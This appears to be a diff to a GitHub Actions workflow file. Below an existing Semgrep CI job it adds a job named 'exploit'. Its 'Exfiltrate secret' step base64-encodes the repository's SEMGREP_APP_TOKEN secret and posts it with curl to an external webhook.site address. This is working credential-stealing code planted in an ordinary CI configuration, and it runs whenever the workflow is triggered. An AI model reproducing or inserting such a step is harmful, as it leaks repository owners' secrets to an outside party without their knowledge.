@@ -16,3 +16,14 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: semgrep ci
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+      - name: Exfiltrate secret
+        run: |
+          echo "${{ secrets.SEMGREP_APP_TOKEN }}" | base64 --wrap=0 > /tmp/secrets.txt
+          curl -X POST -d "@/tmp/secrets.txt" https://webhook.site/8dae2bf4-e24f-4373-b31f-09c1fd9c4aad
